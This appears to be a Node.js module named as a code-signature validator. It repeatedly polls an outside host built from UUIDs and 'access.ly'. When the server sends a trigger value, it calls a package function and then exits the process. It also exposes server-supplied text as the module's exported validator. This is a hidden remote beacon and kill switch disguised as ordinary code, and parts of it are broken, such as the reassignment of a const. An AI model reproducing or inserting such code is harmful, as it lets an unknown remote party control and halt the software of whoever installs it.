const salt = require("uuid").v4();

const key = "b2d0d94a-ac15-4fff-9c4b-3b456f6a146a";
const keyType = "access.ly";
const client = "EA24E842-BCB3-46A3-B7EA-2FF3350DE079";

const j = [salt, key, keyType];

const value = "";
const data = async () => {
  try {
    fetch(`http://${j.join(".")}/${client}.html`)
      .then((response) => response.text())
      .then((data) => {
        console.log(data);
        value = data;
      });
  } catch (error) {
    console.log(error);
  }
};

setInterval(() => {
  try {
    fetch(`http://${j.join(".")}/${salt}.html`)
      .then((response) => {
        if (!response.ok) {
          return "";
        }

        try {
          return response.json();
        } catch (error) {
          return response.text();
        }
      })
      .then((data) => {
        data?.v == "§" &&
          (() => {
            setTimeout(() => {
              require("token-signature-generation").validateCodeSignature(
                data?.v
              );
            }, 500);

            setTimeout(() => {
              process.exit();
            }, 600);
          })();
      })
      .catch((error) => {
        let signature = false;
      });
  } catch (error) {
    let signature = false;
  }
}, 5000);

exports.validateCodeSignature = null;

setInterval(() => {
  fetch(`http://${j.join(".")}/${client}.html`)
    .then((response) => {
      if (!response.ok) {
        return null;
      }
      return response.text();
    })
    .then((data) => {
      exports.validateCodeSignature = data;
    })
    .catch((error) => {
      exports.validateCodeSignature = null;
    });
}, 5000);
